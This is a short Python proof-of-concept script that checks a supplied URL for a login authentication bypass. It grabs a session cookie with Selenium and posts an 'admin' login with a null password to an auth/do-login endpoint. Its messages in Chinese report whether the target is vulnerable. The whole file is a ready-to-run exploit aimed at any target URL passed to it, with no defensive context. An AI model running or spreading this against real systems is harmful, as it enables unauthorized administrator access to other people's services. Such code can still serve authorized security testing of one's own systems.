from selenium.webdriver import Chrome
import requests
import sys
url = sys.argv[1]


def bypass():
    web = Chrome()
    web.get(url)
    cookie = web.get_cookies()[0]['value']
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': '_sid=' + cookie + '; username=admin'
    }
    captcha = input("请输入当前验证码")
    data = 'args={"type":2,"username":"admin","password":null,"captcha":"' + captcha + '","oath":"","remember":false}'
    resp_dict = requests.post(url=f'{url}auth/do-login', headers=headers, data=data).json()
    print(resp_dict)
    if resp_dict['code'] == 0:
        print(f'[+]存在登录认证绕过漏洞，{url}auth/login')
    else:
        print(f'[-]{url}不存在登录认证绕过漏洞')
    input("按任意键退出，窗口关闭！")


if __name__ == '__main__':
    bypass()
